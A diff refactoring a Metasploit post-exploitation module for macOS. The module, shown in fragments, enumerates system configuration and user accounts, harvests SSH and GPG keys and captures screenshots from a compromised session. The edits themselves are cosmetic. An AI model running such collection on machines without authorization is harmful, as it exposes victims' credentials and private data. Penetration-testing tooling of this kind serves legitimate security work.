@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Auxiliary::Report
@@ -53,7 +53,6 @@ class Metasploit3 < Msf::Post
 
   #parse the dslocal plist in lion
   def read_ds_xml_plist(plist_content)
-
     require "rexml/document"
 
     doc  = REXML::Document.new(plist_content)
@@ -132,11 +131,7 @@ class Metasploit3 < Msf::Post
     when /shell/
       osx_ver = cmd_exec("/usr/bin/sw_vers -productName").chomp
     end
-    if osx_ver =~/Server/
-      return true
-    else
-      return false
-    end
+    return osx_ver =~/Server/
   end
 
   # Enumerate the OS Version
@@ -148,13 +143,10 @@ class Metasploit3 < Msf::Post
     when /shell/
       osx_ver_num = cmd_exec('/usr/bin/sw_vers -productVersion').chomp
     end
-
     return osx_ver_num
   end
 
   def enum_conf(log_folder)
-
-    session_type = session.type
     profile_datatypes = {
       'OS' => 'SPSoftwareDataType',
       'Network' => 'SPNetworkDataType',
@@ -188,11 +180,11 @@ class Metasploit3 < Msf::Post
     profile_datatypes.each do |name, profile_datatypes|
       print_status("\tEnumerating #{name}")
       # Run commands according to the session type
-        if session_type =~ /meterpreter/
+        if session.type =~ /meterpreter/
           returned_data = cmd_exec('system_profiler', profile_datatypes)
           # Save data lo log folder
           file_local_write(log_folder+"//#{name}.txt",returned_data)
-        elsif session_type =~ /shell/
+        elsif session.type =~ /shell/
           begin
             returned_data = cmd_exec("/usr/sbin/system_profiler #{profile_datatypes}", 15)
             # Save data lo log folder
@@ -207,11 +199,11 @@ class Metasploit3 < Msf::Post
       print_status("\tEnumerating #{name}")
       # Run commands according to the session type
       begin
-        if session_type =~ /meterpreter/
+        if session.type =~ /meterpreter/
           command_output = cmd_exec(command[0],command[1])
           # Save data lo log folder
           file_local_write(log_folder+"//#{name}.txt",command_output)
-        elsif session_type =~ /shell/
+        elsif session.type =~ /shell/
           command_output = cmd_exec(command[0], command[1])
           # Save data lo log folder
           file_local_write(log_folder+"//#{name}.txt",command_output)
@@ -222,9 +214,7 @@ class Metasploit3 < Msf::Post
     end
   end
 
-
   def enum_accounts(log_folder,ver_num)
-
     # Specific commands for Leopard and Snow Leopard
     leopard_commands = {
       'Users' => ['/usr/bin/dscacheutil', '-q user'],
@@ -261,13 +251,11 @@ class Metasploit3 < Msf::Post
         file_local_write(log_folder + "//#{name}.txt", command_output)
       end
     end
-
   end
 
 
   # Method for getting SSH and GPG Keys
   def get_crypto_keys(log_folder)
-
     # Run commands according to the session type
     if session.type =~ /shell/
 
@@ -349,7 +337,6 @@ class Metasploit3 < Msf::Post
             end
           end
         end
-
       end
     end
   end
@@ -381,7 +368,6 @@ class Metasploit3 < Msf::Post
         end
       end
       print_status("Screenshot Captured")
-
     end
   end
 
